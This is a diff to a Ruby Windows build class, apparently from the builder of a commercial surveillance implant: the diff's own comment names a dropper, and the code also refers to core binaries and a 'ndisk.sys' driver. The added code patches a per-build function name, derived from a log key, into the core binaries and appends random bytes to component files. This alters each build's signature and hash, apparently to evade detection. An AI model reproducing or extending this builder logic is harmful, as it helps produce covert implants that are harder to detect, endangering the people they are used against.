@@ -33,7 +33,23 @@ class BuildWindows < Build
     # invoke the generic patch method with the new params
     super
 
-    # we have an exception here, the core64 must be patched only with the signature
+    # calculate the function name for the dropper
+    @funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]
+
+    file = File.open(path('core'), 'rb+')
+    content = file.read
+
+    begin
+      content.gsub! 'PFTBBP', @funcname
+    rescue
+      raise "Funcname marker not found"
+    end
+
+    file.rewind
+    file.write content
+    file.close
+
+    # we have an exception here, the core64 must be patched only with the signature and function name
     file = File.open(path('core64'), 'rb+')
     content = file.read
 
@@ -45,10 +61,21 @@ class BuildWindows < Build
     rescue
       raise "Signature marker not found"
     end
-    
+
+    begin
+      content.gsub! 'PFTBBP', @funcname
+    rescue
+      raise "Funcname marker not found"
+    end
+
     file.rewind
     file.write content
     file.close
+
+    # add random bytes to codec, rapi and sqlite
+    add_random(path('codec'))
+    add_random(path('rapi'))
+    add_random(path('sqlite'))
 
   end
 
@@ -110,6 +137,7 @@ class BuildWindows < Build
         f.puts "HSYS=ndisk.sys"
         f.puts "HKEY=#{key}"
         f.puts "MANIFEST=" + ((params['admin'] == true) ? 'yes' : 'no')
+        f.puts "FUNC=" + @funcname
       end
 
       CrossPlatform.exec path('cooker'), '-C -R ' + path('') + ' -O ' + path('output')
@@ -126,6 +154,7 @@ class BuildWindows < Build
                                           path(@scrambled[:codec])+' '+
                                           @scrambled[:dir]+' '+
                                           manifest +' '+
+                                          @funcname +' '+
                                           executable + ' ' +
                                           path('output')
     end
@@ -147,6 +176,11 @@ class BuildWindows < Build
     # this is the only file we need to output after this point
     @outputs = ['output.zip']
 
+  end
+
+
+  def add_random(file)
+    File.open(file, 'a+') {|f| f.write SecureRandom.random_bytes(16)}
   end
 
 end
